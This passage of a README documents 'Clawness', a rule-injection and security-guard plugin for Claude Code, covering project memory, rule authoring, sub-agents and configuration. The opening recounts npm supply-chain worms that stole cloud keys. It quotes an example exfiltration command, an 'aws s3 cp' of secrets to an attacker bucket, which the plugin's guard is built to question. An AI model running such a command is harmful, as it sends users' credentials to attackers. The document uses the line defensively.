- **`nx` / Shai-Hulud npm supply-chain worms (2025–2026):** a compromised package's `postinstall` harvested AWS/GCP/Azure keys and exfiltrated data to attacker infrastructure, via a hardcoded webhook, a public GitHub repo, and in the `nx`/UNC6426 case straight out of the victim's **S3 buckets**. This is why **every cloud upload now prompts** (`aws s3 cp`/`gsutil`/`az blob`), even to a bucket named in your own source. A malicious dependency can *write* its own bucket name into your code to look "trusted", so the guard won't go quiet on that basis (v0.7.1), and `aws s3 cp <secrets> s3://attacker-bucket` still asks, however broadly you've allowed things. [The Hacker News](https://thehackernews.com/2026/03/unc6426-exploits-nx-npm-supply-chain.html)

None of these would be *guaranteed* stopped, just made louder: a question you have to answer, a flagged change, a blocked upload. Your operating system's sandbox is the wall; this is the tripwire in front of it.

---

## Per-Project Setup

Global rules handle security, testing, general best practices, and framework conventions. For project-specific rules (your API format, your database conventions, your naming patterns), use `init`:

```bash
cd ~/projects/my-app
clawness init .
```

This scans your project and reports:

```
Project: /home/you/projects/my-app

Detected stack:
  + Node.js project
  + TypeScript
  + Next.js
  + Capacitor (mobile)
  + React
  + Prisma ORM

Recommended rule domains: capacitor, general, nextjs, react, typescript, workflows

Starter project rule:
  id: MY_APP-STACK-001
  domain: my-app
  ...
```

Add `--write` to create the project rules directory:

```bash
clawness init . --write
```

This creates `.clawness/rules/` and a starter `.clawness/memory.md` in your project. The hook automatically picks up rules from this directory when you're working in the project. **Commit `.clawness/` to git** so your whole team gets the same rules.

### Project Rules Directory

```
my-app/
├── .clawness/
│   ├── memory.md                 # Per-codebase lessons, retrieved per prompt
│   ├── handoff.md                # Outstanding note for the next session (gitignore)
│   ├── handoffs/done/            # Superseded handoffs, timestamped
│   └── rules/
│       ├── _mandatory/           # Project-specific mandatory rules
│       │   └── MYAPP-DEPLOY-001.yml
│       └── my-app/               # Project-specific ranked rules
│           ├── MYAPP-API-001.yml
│           └── MYAPP-DB-001.yml
├── src/
├── package.json
└── ...
```

Rules in `.clawness/rules/_mandatory/` are always injected when working in this project. Rules in other subdirectories are ranked as usual.

### Project Memory (lessons learned)

`.clawness/memory.md` is a plain-markdown log of per-codebase gotchas: build
quirks, recurring mistakes, hard-won fixes. Clawness retrieves from it on every
prompt (right after the rules block), so a lesson recorded once is recalled when
it's relevant instead of re-discovered.

**It creates itself.** The first time you open a project (in a git repo),
Clawness's SessionStart hook writes a starter `.clawness/memory.md` and tells
Claude to let you know it exists, so you can see it working from day one. To add
to it, just say **"remember this: …"** and Claude appends a lesson, or edit the
file directly. (Opt out of auto-create with `CLAW_NO_MEMORY=1`; it never touches
the home directory or non-git folders, and goes silent once the file exists.)

Claude also maintains it on its own: mandatory rule `ENF-MEM-001` tells it to
record a lesson when you ask or when a correction repeats, one line of 120
characters or less, merging near-duplicates and trimming the file as it grows —
and to put it **here rather than in `CLAUDE.md`**, which is re-read in full on
every turn instead of being ranked. More on that split [below](#claudemd-vs-project-rules-vs-memorymd).

**The log is searched, not dumped.** This is the part that keeps it cheap. A
memory file is the obvious thing to paste into context wholesale, and that's
exactly what makes it expensive: it grows every week, it's re-sent on every turn
of every session, and 95% of it has nothing to do with what you just asked. So
Clawness searches the log the same way it searches the rules, and injects only
the entries that match what you just asked:

```markdown
## Always
- entries here are injected every turn (keep to 3)

## Lessons
- everything here is ranked against your prompt; the top few are injected
```

A 200-entry log therefore costs about what a 4-entry log costs: three matched
lines, not two hundred. The pinned `## Always` section is the deliberate
exception, capped at three entries, for the handful of things that really do
apply to every turn. Headings and HTML comments are stripped before injection
too. Those are for the human editing the file, and they were costing around 107
tokens a turn on a log with nothing in it yet.

Three details worth knowing if you tune it:

- **Lessons and rules are searched separately.** They don't compete for the same
  slots, so a lesson can never crowd out a rule, and nothing you write in your
  memory file can make rule matching worse.
- **A lesson has to match more strongly than a rule does** (`0.20` against the
  rules' `0.06`). Scores run higher when there's less to compare against, and an
  unasked-for lesson should have to earn its place. On real logs, genuine matches
  score 0.44 to 0.70 and coincidental word overlap scores 0.07 to 0.09, so the
  default sits in the gap between them.
- **Only the newest 200 entries are searched** (`CLAW_MEMORY_MAX_ENTRIES`), so a
  log that gets away from you can't slow the hook down: about 1.6 ms at 40
  entries, 7 ms at 200.

Tuning: `CLAW_MEMORY_TOP_K` (default `3`) is how many lessons can match per turn,
`CLAW_MEMORY_MIN_RELEVANCE` (default `0.20`) is how strong a match has to be,
`CLAW_MEMORY_PIN_BUDGET` (default `400`) caps the always-on section, and
`CLAW_MEMORY_BUDGET` (default `1200`) is the overall character limit. Set
`CLAW_MEMORY_TOP_K` high to go back to injecting effectively everything.

Two cases show entries regardless of match: the first prompt of a session, and
any turn right after the file changed, so a lesson written mid-session is never
invisible on the next turn. **Commit the file** so the whole team shares the same
hard-won knowledge.

### CLAUDE.md vs project rules vs memory.md

Claude Code already has a place to put project knowledge — `CLAUDE.md` — and it works
differently from everything above. **CLAUDE.md is loaded by Claude Code itself, in
full, on every single turn, before any hook runs.** Nothing Clawness does can budget
it or trim it. That's fine for a page of orientation, and expensive for the file it
tends to become after a year of "just add a note about this".

So there are three homes, and one question tells you which:

| | Loaded | Cost per turn | Put here |
|---|---|---|---|
| `CLAUDE.md` | every turn, in full | the whole file, uncapped | what must fire **even when nothing in your prompt hints at it** — what the project is, key files, workflow, and the one-line form of every "don't change this without reading why" |
| `.clawness/rules/` | when it matches your prompt | inside `CLAW_BUDGET` | long rationale attached to specific code — the *why* behind a design, in full, surfaced when you're actually in that file |
| `.clawness/memory.md` | top 3 matches | ≤1200 characters | one-line traps that already bit you |

The question is the first column: **does it need to fire when the prompt gives no hint
that it applies?** If yes, it has to be in CLAUDE.md, because retrieval can't be relied
on to guess. If no, retrieval is strictly cheaper — you pay for it on the turns it
matters instead of all of them.

**Clawness will mention this once if your CLAUDE.md gets large.** Over roughly 6,000
tokens (`CLAW_CLAUDE_MD_LIMIT`) — at which point the file outweighs everything Clawness
injects, on every turn of every session — a session-start check tells Claude to give you
the number and offer the split. It never edits CLAUDE.md, and it asks once per project,
returning only if the file grows by half again. Off with `CLAW_NO_CLAUDE_MD_CHECK=1`, or
a `.clawness/claude-md-check-off` file in a project that should never be asked.

**One gap worth knowing about.** When Claude records a lesson, mandatory rule
`ENF-MEM-001` sends it to `.clawness/memory.md`. But when **you** use Claude Code's own
`#` shortcut, that writes to `CLAUDE.md` directly — no hook or rule sits in that path, so
Clawness can't route it. If you want a note ranked rather than re-read every turn, say
"remember this: …" instead of using `#`.

---

## Writing Rules

### The easy way: describe it

In any Claude Code session, describe the rule and let Clawness write it:

```
/clawness:add always use server actions for form mutations in Next.js
```

It generates a properly-tagged rule (with `violation`/`correct` examples), saves it to your project's `.clawness/rules/` (or the global set if there's no project dir), and confirms before writing. No YAML by hand.

Prefer to author them yourself? The format:

### Rule Format

```yaml
id: FA-PYDANTIC-001
domain: fastapi
severity: error          # error | warning | info
tags: [pydantic, model, schema, validation, request, response]
triggers: [BaseModel, schema, model, request, response, body, Field]
when: Defining request or response shapes for any endpoint.
rule: >
  Define Pydantic models for every request body and response. Never
  accept or return raw dicts. Use separate models for create, update,
  and read operations.
violation: "@app.post('/users') async def create(data: dict)"
correct: "@app.post('/users', response_model=UserRead) async def create(data: UserCreate)"
```

### What Each Field Does

| Field | Required | Drives Retrieval? | Purpose |
|-------|----------|-------------------|---------|
| `id` | Yes | Yes | Unique ID, shown in output |
| `domain` | Yes | Yes | Category for filtering |
| `severity` | No | No | `error` / `warning` / `info` |
| `tags` | **Recommended** | **Yes** | Keywords — what topic does this rule cover? |
| `triggers` | **Recommended** | **Yes** | Code tokens that signal relevance |
| `when` | **Recommended** | Yes | When should this rule apply? |
| `rule` | Yes | Yes | The instruction Claude follows |
| `violation` | No | Yes | What NOT to do |
| `correct` | No | Yes | What TO do |

### Tips for Good Rules

**`tags` and `triggers` are the most important fields.** The retriever matches your prompt against these. Think: *what words would someone use when working on a task this rule applies to?*

```yaml
# Bad — too generic
tags: [code]
triggers: [function]

# Good — specific to the actual concept
tags: [database, connection, pooling, timeout, postgres]
triggers: [create_engine, SessionLocal, get_db, connection_pool]
```

**Use `_mandatory/` sparingly.** Every mandatory rule costs tokens on every prompt. Reserve it for security gates and testing requirements.

**Run `lint` after adding rules:**

```bash
clawness lint
```

`lint` checks required fields and **rejects vague phrasing**. A rule that says "validate input *where appropriate*" or "*try to* handle errors" isn't enforceable. State the rule precisely.

**Check retrieval still works after adding rules:**

```bash
clawness eval     # MRR@5 + hit-rate against tests/ground_truth.json
```

If you add rules in a new area, add a query or two to `tests/ground_truth.json` so the test set keeps pace with the rules.

---

## Sub-Agents

Clawness ships seven adversarial sub-agents that Claude Code can delegate to. The main ones are below; the full list with model and effort settings is in the [Configuration](#agent-model-configuration) table.

### Security Red Team / Blue Team

When you say *"run a security audit on the auth module"*, the workflow rule tells Claude to:
1. **Delegate to `security-red-team`**, which thinks like an attacker, runs OWASP Top 10, and searches for CVEs published *this month* affecting your stack.
2. **Delegate to `security-blue-team`**, which takes the red team report, triages findings, proposes exact code fixes, and adds hardening measures.
3. **Synthesize.** Claude merges both reports into a prioritized action plan.

### Code Critic

For code reviews before merge. Focuses on bugs, performance, edge cases, and maintainability, which is what the original author is blind to.

### Architecture Challenger

Devil's advocate for design decisions. Stress-tests assumptions: *what if it's 10x the load? what if this component fails? is there a simpler alternative?*

### Triggering Agents

You can invoke them directly:

```
> have the security-red-team agent review the auth module
> have the code-critic agent review my latest changes
```

Or just describe the task naturally, since the workflow rules tell Claude when to reach for them:

```
> run a security audit on this project
> review the code before we merge
> should we use PostgreSQL or MongoDB for this?
```

**Proactive offers.** Spawning sub-agents is expensive, so the `audit`/`review`/`perf` skills never auto-run. When your prompt sounds like a security audit, review, or perf check, Clawness nudges Claude to *offer* first and only spawns them once you agree. You can also run them directly with `/clawness:audit`, `/clawness:review`, `/clawness:perf`.

---

## CLI Reference

The CLI is optional, since everyday use needs no commands. It's installed by the **manual installer** (and by any `pip install` of the package), which puts a `clawness` command on your PATH. **Plugin-only users:** the rule injection, agents, skills, and plan gate all work without the CLI. To get the `clawness` command too, run `pip install -e <plugin-dir>` or just do a [manual install](#option-2-manual-install).

```bash
# Retrieve rules for a task description
clawness query "implement async REST endpoint"
clawness query "handle null values" --domain typescript
clawness query "set up logging" --top-k 3 --budget 2000

# Scan a project and suggest rules
clawness init /path/to/project
clawness init . --write    # create .clawness/rules/ in this project

# Managing the rule set
clawness stats             # show rule counts by domain + per-turn token estimate
clawness lint              # validate rule files (incl. vague-phrasing check)
clawness bench             # benchmark retrieval latency
clawness eval              # retrieval quality: MRR@5 + hit-rate vs. ground truth
clawness eval --floor-mrr 0.85 --floor-hit 0.95   # fail below floors (CI gate)

# Plan gate (on by default; normal flow uses native plan mode)
clawness plan status       # show gate state, and what turned it off if it is

# Emit an AGENTS.md so any agent (not just Claude Code) can use the CLI
clawness agents-md --write

# Point at a different rules directory
clawness --rules-dir /path/to/rules stats
```

> If `clawness` isn't found after install, your Python user-scripts directory isn't on your PATH. Either add it, or use the identical long form `python -m clawness.cli <command>` (`python3` on macOS/Linux), which works from any directory.

---

## What Ships

| Component | Count | Purpose |
|-----------|-------|---------|
| **Rules** | 195 across 28 domains | Coding, science, research and LLM standards, injected per-prompt |
| **Agents** | 7 sub-agents | Security red/blue team, code critic, test writer, perf auditor, refactor advisor, architecture challenger |
| **Skills** | 6 slash commands | `/clawness:audit`, `/clawness:review`, `/clawness:test`, `/clawness:perf`, `/clawness:add`, `/clawness:status` |
| **Hooks** | 12 (rule injection, context watch & model-tier check, output compression, plan gate, access guard, trust ledger, git check, memory bootstrap, handoff pickup, stack & version detection, changelog check, CLAUDE.md size check, dependency bootstrap) | Automatic context management, workflow enforcement & session security |
| **CLI** | 9 commands | query, init, stats, lint, bench, eval, plan, agents-md, audit-skills |
| **Installers** | bash + PowerShell (with matching uninstallers) | 7-step setup for Windows, macOS, Linux |
| **Plugin manifest** | marketplace + plugin | For `claude plugin install` |

### Rule Domains

| Domain | Rules | Covers |
|--------|-------|--------|
| `general` | 23 | Cross-cutting: prior art before building, abstraction/YAGNI, comments, memory, nesting, magic numbers, immutability, dependency selection, versioning/lockfiles, matching the version a project already installs, changelog upkeep, release & version numbering, linting, naming, validation, logging, env config, accessibility, git, performance *(3 mandatory)* |
| `science` | 14 | Physics/maths/engineering practice: prior art, dimensional consistency, numerical stability, uncertainty propagation, statistical discipline, derivation checking, solver validation, reproducibility, paper claims, figure standards, array/dataframe correctness (views, dtype, NaN), notebook hygiene, parallel and GPU determinism, scientific data formats |
| `security` | 11 | Auth, secrets, deps, untrusted-content/exfil *(4 mandatory)*; SQLi, XSS, package supply-chain, SSRF, path traversal, object-level authz/IDOR, password hashing & crypto *(ranked)* |
| `workflows` | 11 | Multi-agent orchestration (security audit, code review, testing, perf, refactoring, architecture, parallel research), session handoff, sub-agent cost/vetting, and lessons-memory upkeep *(1 mandatory)* |
| `nextjs` | 10 | Server/Client components, data fetching, caching, layouts, metadata, Server Actions |
| `research` | 9 | Source hygiene (primary sources, inference vs claim, date-bounded sweeps, reporting disagreement) and the research programme (falsifiable questions, mapping a frontier, novelty negative-search, cross-domain mapping, structured synthesis) |
| `fastapi` | 8 | Pydantic v2, dependency injection, async, error handling, CORS, DB sessions |
| `meta` | 8 | Rationalization counters — rebuttals to common AI shortcuts ("too simple to test", hardcode "temporarily", "I'll refactor later", trusting input) |
| `llm` | 7 | Building with models: eval sets for prompt changes, prompt injection into tool-using agents, schema-constrained output, token cost & caching, testing non-determinism, model-id pinning, retrieval over context-stuffing |
| `python` | 7 | Async I/O, imports, error handling, type hints, mutable defaults, context managers, pathlib |
| `testing` | 7 | Coverage for new code *(1 mandatory)*; watching a test fail before trusting it green, testing on the boundary rather than near it, determinism, mocking at the boundary, assertion specificity, test isolation *(ranked)* |
| `capacitor` | 6 | Platform detection, permissions, lifecycle, WebView, sync, App Store |
| `css` | 6 | `!important`, relative units, flex/grid layout, custom properties, responsive, focus states |
| `docker` | 6 | Layer caching, multi-stage builds, non-root, secrets, tag pinning, slim images |
| `java` | 6 | Null safety, equals/hashCode, try-with-resources, exceptions, immutability, collections |
| `cfd` | 5 | Mesh quality and y+, residual convergence vs grid convergence (GCI), Courant number and steady-vs-transient, turbulence model choice, boundary conditions and domain extent |
| `go` | 5 | Error handling, nil maps, context, goroutine lifecycle, data races |
| `reliability` | 5 | Network timeouts, bounded retry with backoff/jitter, idempotency keys, rate limiting, graceful degradation |
| `rust` | 5 | unwrap/expect, error handling, clone, unsafe, iterators |
| `sql` | 5 | N+1 queries, indexes, transactions, `SELECT *`, migrations |
| `bash` | 4 | Strict mode, quoting, error checking, shellcheck |
| `fortran` | 4 | `implicit none` and modern source form, `intent` on every argument, explicit `real64` precision, column-major array order and allocation |
| `julia` | 4 | Type stability in hot functions, allocation and views, multiple dispatch and type piracy, `Project.toml`/`Manifest.toml` environments |
| `matlab` | 4 | Preallocation and vectorised indexing, numeric conversion and `\` over `inv`, functions over workspace-dependent scripts, reproducible figures and seeds |
| `r` | 4 | `NA` semantics in comparisons and summaries, type coercion on read and subset, vectorised over accumulating loops, `renv`/session reproducibility |
| `react` | 4 | Hooks, state management, list keys, forms |
| `typescript` | 4 | Null safety, async errors, strict mode, Zod |
| `ci` | 3 | SHA-pinned third-party actions, OIDC over long-lived secrets, never running fork-PR code with secrets |

The 9 **mandatory** rules (always injected, never ranked) are the 4 `security` rules, the
1 `testing` rule, the lessons-memory rule (counted under `workflows`), and 3 counted under
`general`: current-practices, verification/confidence, and output voice — the last one
keeps Claude from narrating the rules system at you or restating your request back.

`llm` rules are **held back by project type**. Like the language domains, they have to match
more strongly in a project with no LLM library installed, so prompt-caching advice stays out
of a plain Rust repo. `science` and `research` are exempt on purpose: a researcher often works
in a bare or LaTeX-only directory where nothing is detected, and holding them back would
silence them exactly there.

---

## Configuration

### Environment Variables

| Variable | Default | Purpose |
|----------|---------|---------|
| `CLAW_RULES_DIR` | (next to hook script) | Override global rules directory |
| `CLAW_TOP_K` | `5` | Max ranked rules per prompt |
| `CLAW_BUDGET` | `4000` | Max tokens for the rule block. Project memory has its own separate limit, so the total injected is roughly `CLAW_BUDGET` + `CLAW_MEMORY_BUDGET` + a few fixed lines |
| `CLAW_MIN_RELEVANCE` | `0.06` | Minimum match score for a rule. Below it, a rule counts as coincidence and isn't injected. Raise it for fewer, more on-topic rules; set `0` to turn the minimum off |
| `CLAW_TOPICAL_MIN_RELEVANCE` | `0.12` | The middle bar, for `science` and `research`. These are never held back by project type, so a bare or LaTeX-only directory still gets them, and this is what keeps them out of ordinary coding results. Set to `0.06` to turn off. Never goes below `CLAW_MIN_RELEVANCE` |
| `CLAW_OFFSTACK_MIN_RELEVANCE` | `0.15` | The higher bar, for language and framework rules your project doesn't use (SQL or React rules in a Python repo, say). Keeps vague prompts on-topic while letting a genuinely strong match from elsewhere through. Never goes below `CLAW_MIN_RELEVANCE` |
| `CLAW_NARROW_MIN_RELEVANCE` | `0.22` | The highest bar, for the CFD, Julia, Fortran, MATLAB and R rules when your project isn't one of those. Their vocabulary (solver, converge, residual, vectorize) overlaps everyday programming, so off-project they need a distinctly strong match. No effect inside a project that does use them. Never goes below `CLAW_OFFSTACK_MIN_RELEVANCE` |
| `CLAW_NO_STACK_FILTER` | (unset) | Stop taking the project's languages into account; treat every domain the same |
| `CLAW_NO_MEMORY` | (unset) | Don't auto-create `.clawness/memory.md` on first session |
| `CLAW_MEMORY_BUDGET` | `1200` | Hard character limit on the whole project-memory block |
| `CLAW_MEMORY_TOP_K` | `3` | Max ranked lessons injected per prompt. Set high to inject the whole log every turn (the pre-1.2 behavior) |
| `CLAW_MEMORY_MIN_RELEVANCE` | `0.20` | Minimum match score for a lesson. Higher than the rules' bar because scores run higher across a small file, and an unasked-for lesson should have to earn its place. `0` turns it off |
| `CLAW_MEMORY_PIN_BUDGET` | `400` | Max characters of the always-injected `## Always` section |
| `CLAW_MEMORY_MAX_ENTRIES` | `200` | Only the newest N lessons are searched, so a log that gets away from you can't slow the hook down (~1.6 ms at 40 entries, ~7 ms at 200) |
| `CLAW_NO_STACK_NOTE` | (unset) | Don't inject the detected-stack note at session start |
| `CLAW_NO_MODEL_ADVISOR` | (unset) | Don't check the session's model tier against the opening task |
| `CLAW_NO_CONTEXT_WATCH` | (unset) | Disable the context-pressure warnings |
| `CLAW_CONTEXT_LIMIT` | (auto) | Your context window in tokens. Auto-detected from the `[1m]` marker on your configured model, then corrected upward if usage exceeds the assumption. Set it explicitly if that guess is wrong |
| `CLAW_CONTEXT_WARN` | `0.70` | Fraction of the window at which to mention context is filling |
| `CLAW_CONTEXT_URGENT` | `0.85` | Fraction at which to recommend a fresh session and offer a handoff |
| `CLAW_CONTEXT_SURGE` | `0.12` | A single turn adding this fraction of the window is flagged (only when ≤5 turns of headroom remain) |
| `CLAW_NO_HANDOFF` | (unset) | Don't pick up `.clawness/handoff.md` at session start |
| `CLAW_HANDOFF_BUDGET` | `2000` | Max characters of the handoff injected at session start (keeps the head) |
| `CLAW_VERBOSE` | (unset) | Render mandatory rules in full (`WHEN`/`BAD`/`GOOD`) instead of compact, and show retrieval metadata (relevance scores, timing). More tokens per turn |
| `CLAW_COMPACT` | (unset) | Also render ranked rules compactly (directive only). Fewer tokens per turn |
| `CLAW_FULL_EVERY` | `5` | Show the full mandatory block on prompt 1 and every Nth prompt after (abbreviated to an id list in between). The same rules stay binding either way. `1` restores the old every-turn-full behavior |
| `CLAW_NO_PLAN_GATE` | (unset) | Turn the plan gate off. This and `plan_gate.enabled: false` in `~/.claude/clawness/config.json` are the only two switches; there is deliberately no per-project one |
| `CLAW_NO_ACCESS_GUARD` | (unset) | Turn off the access guard, so data-sending and destructive commands are no longer questioned |
| `CLAW_NO_TRUST_LEDGER` | (unset) | Don't fingerprint skills/agents/MCP or warn when they change |
| `CLAW_NO_GIT_CHECK` | (unset) | Stop offering to `git init` when a project isn't under version control |
| `CLAW_NO_CHANGELOG_CHECK` | (unset) | Stop the session-start changelog reminder, and the one-time offer to create one |
| `CLAW_NO_CLAUDE_MD_CHECK` | (unset) | Stop the one-time note about an oversized `CLAUDE.md` |
| `CLAW_CLAUDE_MD_LIMIT` | `6000` | Estimated tokens of `CLAUDE.md` above which that note fires. Below it, nothing is said |
| `CLAUDE_CONFIG_DIR` | `~/.claude` | Claude Code's config dir. The installer and uninstaller follow it if you've relocated it |
| `CLAUDE_CODE_SUBAGENT_MODEL` | (none) | Override model for ALL sub-agents |

### Agent Model Configuration

Split by **what the agent is for**, not by role:

- **Judgment and adversarial work inherits your session's model.** A security review, an architecture challenge, or a code critique is only as good as the model making the call, and if it ran a tier below the one you chose you'd get a shallower answer that reads exactly like a thorough one. `model:` is simply omitted on these, which is Claude Code's `inherit` default.
- **Mechanical work is pinned to `sonnet`.** Test generation and pattern scans don't need your top tier, and pinning them is a genuine saving.

Clawness never hardcodes a frontier model in a shipped agent, because it can't know your plan, access, or budget.

| Agent | Model | Effort | Max Turns |
|-------|-------|--------|-----------|
| `security-red-team` | inherit | high | 25 |
| `security-blue-team` | inherit | high | 25 |
| `arch-challenger` | inherit | high | 15 |
| `code-critic` | inherit | medium | 15 |
| `test-writer` | `sonnet` | medium | 20 |
| `perf-auditor` | `sonnet` | medium | 15 |
| `refactor-advisor` | `sonnet` | medium | 15 |

**Override** by editing an agent's `.md` in `~/.claude/agents/`. `model:` takes aliases (`haiku`/`sonnet`/`opus`/`fable`), a pinned ID (`claude-opus-5`), or `inherit` (the default when the field is absent); `effort:` runs `low` through `max`; `maxTurns:` caps tool calls. Retarget all sub-agents at once with `CLAUDE_CODE_SUBAGENT_MODEL`, or your own session with `claude --model …` / `/model …`.

### Where Rules Live

| Location | Scope | When Loaded |
|----------|-------|-------------|
| `~/.claude/clawness/rules/` | Global | Every prompt, every project |
| `<project>/.clawness/rules/` | Project | Only when working in that project |
| `<project>/.clawness/rules/_mandatory/` | Project mandatory | Every prompt while in that project |

> The `~/.claude/clawness/rules/` path applies to a **manual** install. With the **plugin** install, the global rules ship inside the plugin and load from its cache automatically, so you don't manage that path. Either way, project rules in `<project>/.clawness/rules/` work the same.

---

## How It Compares

Against [Writ](https://github.com/infinri/Writ) (the hybrid-RAG project that inspired it) and plain Claude Code with no plugin:

| | Writ | **Clawness** | Vanilla Claude Code |
|---|---|---|---|
| Finding the right rules | 5-stage hybrid RAG (BM25 + vector + graph) | Word and concept matching (BM25 + TF-IDF + RRF) | None; CLAUDE.md, loaded in full or mentioned by hand |
| Token cost / turn | selected rules (5k budget) | ~1,300 (mandatory + selected) | all of CLAUDE.md, every turn |
| Infrastructure | Docker + Neo4j + ONNX + daemon (~2 GB) | PyYAML (~200 KB) | none |
| Install | ~5 min (containers) | ~5 sec | built-in |
| Always-on mandatory rules | Yes (30) | Yes (9) | manual discipline |
| Per-project rules | Yes (`(id, project)` keys, with a `_shared` scope) | Yes (`.clawness/rules/`) | per-dir CLAUDE.md |
| Plan-first gate | Yes (token approval) | Yes (uses built-in plan mode) | built-in plan mode (opt-in, not enforced) |
| Output compression | No | Yes | No |
| Adversarial sub-agents | 1 — the review agent, during Work mode's review phase | 7 (red/blue team, critic, …) | general subagents, not preconfigured |
| Guard on data-sending / destructive commands | No | Yes, and it **overrides what you've already allowed** | permission prompts you learn to click through |
| Skill/agent/MCP trust ledger | No | Yes, alerts when one changes | No |

Two notes on the Writ column, from its author. Its sub-agents all run **isolated** —
they get none of the main agent's reasoning — and the adversarial character of the
review agent comes from the **rules it's given**, not from how the agent itself is
written. So the count is one adversarial agent, not none, and not seven.

---

## Troubleshooting

**Plugin install: skills/hooks not showing up**
Run `/reload-plugins`, or check `claude plugin list`. On first session, a background `SessionStart` hook installs **PyYAML** into your environment (a few seconds), which is all the default lexical retrieval needs. Check `bootstrap.log` in the plugin's data directory for progress, and run `claude --debug` to see hook activity. (Make sure Python 3.10+ is on your PATH, or the hooks can't run.)

**Hook not firing / Claude doesn't see rules**
Check `~/.claude/settings.json` contains the hook config. Run the installer again; it's safe to repeat and will report what's already configured versus what it adds.

**PowerShell: "running scripts is disabled"**
```powershell
powershell -ExecutionPolicy Bypass -File .\install.ps1
```

**"No module named yaml"**
```bash
python -m pip install pyyaml --user
```

**Wrong rules appearing / right rules not appearing**
Test what the retriever sees for your exact prompt:
```bash
python -m clawness.cli query "your exact prompt text here"
```
Improve `tags` and `triggers` on the rules that should match.

**Too many mandatory rules eating tokens**
Move rules from `_mandatory/` to a ranked domain. Only security gates and test requirements should be mandatory.

**Want to temporarily disable Clawness**
Rename the hook entries in `~/.claude/settings.json` or delete them. Re-run the installer to add them back.

---

## License

MIT — see [LICENSE](LICENSE).

## Acknowledgments

Inspired by [infinri/Writ](https://github.com/infinri/Writ), which pioneered hybrid-RAG rule retrieval for AI coding agents. Clawness takes the same core ideas and repackages them without the infrastructure.
